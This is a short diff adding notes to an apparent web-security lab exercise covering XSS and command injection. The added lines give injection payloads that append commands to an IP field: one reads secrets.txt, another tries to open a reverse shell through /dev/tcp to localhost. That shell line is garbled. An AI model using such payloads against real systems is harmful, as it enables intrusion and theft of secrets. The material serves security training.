@@ -22,3 +22,10 @@ Task 2: persistent XSS
 
 Task 3: reflected XSS:
 link: `http://localhost:5005/malicious`
+
+Task 4: reverse shell:
+- To echo the contents of secrets.txt:
+- `127.0.0.1; cat secrets.txt`
+
+- To open reverse shell:
+- ```127.0.0.1; nc -i>& /dev/tcp/127.0.0.1/8080 0>&1```
